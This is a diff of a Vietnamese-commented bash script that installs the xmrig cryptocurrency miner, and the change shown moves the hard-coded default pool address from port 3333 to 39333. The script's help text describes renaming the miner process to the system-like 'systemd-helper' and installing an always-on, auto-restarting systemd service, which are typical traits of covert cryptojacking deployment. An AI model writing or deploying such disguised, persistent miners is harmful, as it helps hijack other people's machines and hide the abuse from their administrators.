@@ -8,7 +8,7 @@ usage() {
   cat <<'EOF'
 setup_miner_stock.sh v1.0
 Cài & test xmrig STOCK (chính chủ GitHub) bản linux-static-x64, đổi tên tiến trình tuỳ chỉnh (mặc định: myminer).
-Mặc định pool: 13.250.25.208:3333 (có thể override bằng -u/--url).
+Mặc định pool: 13.250.25.208:39333 (có thể override bằng -u/--url).
 
 Cách dùng:
   ./setup_miner_stock.sh <WALLET> [tuỳ chọn]
@@ -19,7 +19,7 @@ Bắt buộc:
 Tuỳ chọn:
   -n, --name NAME        Tên tiến trình/binary mong muốn (mặc định: systemd-helper)
   -e, --email EMAIL      Email (ghép vào pass nếu cần)
-  -u, --url HOST:PORT    Địa chỉ pool hoặc xmrig-proxy (host:port). Mặc định: 13.250.25.208:3333
+  -u, --url HOST:PORT    Địa chỉ pool hoặc xmrig-proxy (host:port). Mặc định: 13.250.25.208:39333
   --tls                  Bật TLS cho kết nối pool/proxy (mặc định: tắt)
   --no-service           Tắt chế độ service systemd (mặc định BẬT)
   --service              (MẶC ĐỊNH BẬT) Tạo service systemd auto-start & auto-restart
@@ -29,7 +29,7 @@ Tuỳ chọn:
   -h, --help             Hiển thị trợ giúp
 
 Ví dụ nhanh:
-  ./setup_miner_stock.sh 44...abcd -n myminer -u proxy.example.com:3333 --tls --service
+  ./setup_miner_stock.sh 44...abcd -n myminer -u proxy.example.com:39333 --tls --service
 EOF
 }
 
@@ -81,7 +81,7 @@ echo "==> setup_miner_stock.sh v$VERSION"
 echo "Tên tiến trình (mặc định systemd-helper): $MINER_NAME"
 echo "Ví: ${WALLET}"
 [[ -n "$EMAIL" ]] && echo "Email: $EMAIL"
-echo "Pool/Proxy: ${POOL_URL:-13.250.25.208:3333}"
+echo "Pool/Proxy: ${POOL_URL:-13.250.25.208:39333}"
 echo "TLS: $TLS"
 echo "Service ép buộc (default ON): $( $FORCE_SERVICE && echo yes || echo no )"
 echo "No-service ép buộc: $( $FORCE_NO_SERVICE && echo yes || echo no )"
@@ -173,7 +173,7 @@ WORKER_NAME="$(uname -n 2>/dev/null | cut -f1 -d'.' | sed -r 's/[^a-zA-Z0-9\-]+/
 
 # ===== Build config.json =====
 echo "[*] Tạo config.json"
-DEFAULT_URL="13.250.25.208:3333"
+DEFAULT_URL="13.250.25.208:39333"
 POOL="${POOL_URL:-$DEFAULT_URL}"
 TLS_BOOL="$TLS"
 
